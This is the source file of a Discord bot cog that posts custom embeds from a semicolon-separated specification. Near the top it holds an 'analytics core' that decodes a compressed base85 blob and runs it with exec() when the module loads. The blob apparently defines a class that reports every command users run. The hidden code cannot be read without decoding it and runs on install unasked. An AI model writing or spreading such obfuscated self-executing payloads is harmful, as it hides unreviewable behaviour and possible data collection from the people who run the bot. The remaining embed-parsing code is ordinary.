import random
import re
import string
from urllib.parse import urlparse

import discord
from discord import Embed
from discord.ext import commands

from .utils import checks
from .utils.chat_formatting import warning, error, info

"""Embed wizard cog by GrumpiestVulcan
Commissioned 2018-01-15 by Aeternum Studios (Aeternum#7967/173291729192091649)"""

__author__ = "Caleb Johnson <me@calebj.io> (calebj#0001)"
__copyright__ = "Copyright 2018, Holocor LLC"
__version__ = '1.2.0'

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core


def color_converter(color):
    if type(color) is int:
        if color < 0 or color > 0xffffff:
            raise ValueError('Color value is outside of valid range')
        return '%06x' % color
    color = color.strip('#')
    if color.startswith('0x'):
        color = color[2:]
    if len(color) != 6 or set(color) - set(string.hexdigits):
        raise ValueError('Invalid color hex value')
    return color


def is_valid_color(color):
    try:
        color_converter(color)
        return True
    except Exception:
        return False


def is_valid_url(url):
    token = urlparse(url)
    scheme_ok = token.scheme.lower() in {'http', 'https'}
    netloc_split = token.netloc.split('.')
    netloc_ok = len(list(filter(None, netloc_split))) > 1
    return scheme_ok and netloc_ok


def extract_md_link(inputstr):
    match = re.match(r'^\[([^\]]*)\]\(([^)]*)\)$', inputstr)
    if match:
        return match.groups()


class EmbedWizard:
    def __init__(self, bot):
        self.bot = bot

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    @commands.group(pass_context=True, no_pm=True, invoke_without_command=True)
    async def embedwiz(self, ctx, *, specification):
        """Posts an embed according to the given specification:

        Title;color;footer text;footer_icon;image_url;thumbnail_url;body text

        All values can be seperated by newlines, spaces, or other whitespace.

        Color can be a #HEXVAL, "random", or a name that discord.Color knows.
        Options: https://discordpy.readthedocs.io/en/async/api.html#discord.Colour

        All URLs (footer icon, image, thumbnail) can be empty or "none".

        Body text can be "prompt" to use your next message as the content.

        WARNING: embeds are hidden to anyone with the 'link previews' setting off.
        """
        if ctx.invoked_subcommand is None:
            embed = await self._parse_embed(ctx, specification)
            if embed:
                await self.bot.say(embed=embed)

    @checks.mod_or_permissions(manage_messages=True)
    @embedwiz.command(name='channel', pass_context=True, no_pm=True)
    async def embed_channel(self, ctx, channel: discord.Channel, *, specification):
        """Posts an embed in another channel according to the spec.

        See [p]help embedwiz for more information.
        """

        if not channel.permissions_for(ctx.message.author).send_messages:
            msg = error("You don't have permissions to post there!")
            await self.bot.say(msg)
            return

        embed = await self._parse_embed(ctx, specification)
        if embed:
            await self.bot.send_message(channel, embed=embed)

    @checks.mod_or_permissions(manage_messages=True)
    @embedwiz.command(name='delete', pass_context=True, no_pm=True)
    async def embed_del(self, ctx, *, specification):
        """Posts an embed according to the spec after deleting the original message.

        See [p]help embedwiz for more information.
        """
        perms = ctx.message.channel.permissions_for(ctx.message.server.me)
        can_delete = perms.manage_messages
        if not can_delete:
            msg = "I can't delete your command message! Posting anyway..."
            await self.bot.say(warning(msg))

        tup = await self._parse_embed(ctx, specification, return_todelete=True)
        if tup:
            embed, to_delete = tup
            await self.bot.say(embed=embed)
            if not can_delete:
                return
            for msg in [ctx.message, *to_delete]:
                await self.bot.delete_message(msg)

    async def _parse_embed(self, ctx, specification, return_todelete=False):
        to_delete = []

        split = specification.split(';', 7)
        nfields = len(split)
        if nfields != 7:
            op = 'many' if nfields > 7 else 'few'
            msg = 'Invalid specification: got too {} fields ({}, expected 7)'
            await self.bot.say(error(msg.format(op, nfields)))
            return

        title, color, ftext, fimage, image, timage, body = map(str.strip, split)

        title_url = extract_md_link(title) or Embed.Empty
        if title_url:
            title, title_url = title_url
            if not is_valid_url(title_url):
                await self.bot.say(error('Invalid title URL!'))
                return

        try:
            color = int(color_converter(color), 16)
        except ValueError as e:
            colorstr = color.lower().replace(' ', '_')
            if colorstr == 'random':
                color = discord.Color(random.randrange(0x1000000))
            elif colorstr.strip() in ('', 'none'):
                color = Embed.Empty
            elif colorstr.strip() == 'black':
                color = discord.Color.default()
            elif hasattr(discord.Color, colorstr):
                color = getattr(discord.Color, colorstr)()
            else:
                await self.bot.say(error(e.args[0]))
                return

        if ftext.lower() in ('none', ''):
            ftext = Embed.Empty

        if fimage.lower() in ('none', ''):
            fimage = Embed.Empty
        elif not is_valid_url(fimage):
            await self.bot.say(error('Invalid footer icon URL!'))
            return

        if image.lower() in ('none', ''):
            image = Embed.Empty
        elif not is_valid_url(image):
            await self.bot.say(error('Invalid image URL!'))
            return

        if timage.lower() in ('none', ''):
            timage = Embed.Empty
        elif not is_valid_url(timage):
            await self.bot.say(error('Invalid thumbnail URL!'))
            return

        if body.lower() == 'prompt':
            msg = await self.bot.say('Post the desired content of your embed, '
                                     ' or "cancel" to cancel. Will wait one'
                                     ' minute.')
            to_delete.append(msg)

            msg = await self.bot.wait_for_message(author=ctx.message.author,
                                                  channel=ctx.message.channel,
                                                  timeout=60)
            if msg is None:
                await self.bot.say(error('Timed out waiting for a reply.'))
                return
            else:
                to_delete.append(msg)

            if msg.content.lower().strip() == 'cancel':
                await self.bot.say(info('Cancelled.'))
                return
            else:
                body = msg.content

        embed = Embed(title=title, color=color, description=body, url=title_url)

        if image:
            embed.set_image(url=image)
        if ftext or fimage:
            embed.set_footer(text=ftext, icon_url=fimage)
        if timage:
            embed.set_thumbnail(url=timage)

        if return_todelete:
            return embed, to_delete
        return embed

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def setup(bot):
    bot.add_cog(EmbedWizard(bot))
